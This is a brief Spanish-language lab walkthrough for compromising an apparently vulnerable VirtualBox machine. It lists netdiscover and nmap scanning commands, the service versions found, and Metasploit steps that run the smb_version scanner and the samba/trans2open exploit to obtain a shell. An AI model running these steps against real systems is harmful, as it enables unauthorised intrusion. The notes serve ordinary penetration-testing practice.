# Instalar maquina poner en modo puente

## Buscar la ip

```bash
sudo netdiscover -r 10.0.0.0/16
```
Vemos las ip

```bash
sudo nmap 10.0.4.10
nmap -Pn -sV 10.0.4.10
```

Servicios que nos da son estos:

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:D6:95:0F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

## Descubrir version de Samba

```bash
sudo msfconsole

```

```plaintext
search smb_version

set RHOSTS = 10.0.4.10

run

```

## Tirar plainloads para introducir shell

```bash
sudo msfconsole

```

```plaintext
search samba/trans2open

set RHOSTS = 10.0.4.10

run

```

## Tendria una shell para intrar en la maquina
